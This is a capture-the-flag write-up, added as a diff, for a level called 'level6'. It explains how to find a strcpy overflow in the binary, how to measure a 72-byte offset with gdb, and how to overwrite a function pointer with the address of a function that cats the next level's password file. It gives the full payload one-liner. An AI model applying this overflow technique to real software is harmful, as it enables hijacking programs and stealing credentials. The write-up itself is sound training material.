@@ -1,0 +1,37 @@
+This one is completely different from the previous ones.
+
+We start by identifying where the exploit point is : when we disassemble the
+binary we find an utilisation of strcpy (known for buffer overflows exploits ! :D)
+
+Lets use this, what do we need to do ? Basically the exploit of the strcpy
+functions works by overwriting the return value in order to put the value we
+want ! So, lets look into the program 
+
+i functions 
+
+interesting we have m function which is a puts("Nope") anddd bingo !
+
+function n : system("/bin/cat /home/user/level7/.pass");
+
+ok what's the address ? 0x08048454 so we'll have something like \x54\x84\x04\x08
+
+now, we must fill the input to put our return value at the end, but how many
+inputs can we give ? manually i found 72 before a segfault but how can we see it
+in memory ? by examinating the stack we see that we stock 2 values in $esp the
+first is at $esp+0x1c the second at $esp+0x18
+
+lets print them :
+
+(gdb) x/xw $esp+0x1c
+0xbffff6ac:	0x0804a008
+
+(gdb) x/xw $esp+0x18
+0xbffff6a8:	0x0804a050
+
+008 = 8   050 = 80
+
+80 - 8 = 72 the length of our input !
+
+easy exploit for us now : 
+
+./level6  $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"') :)
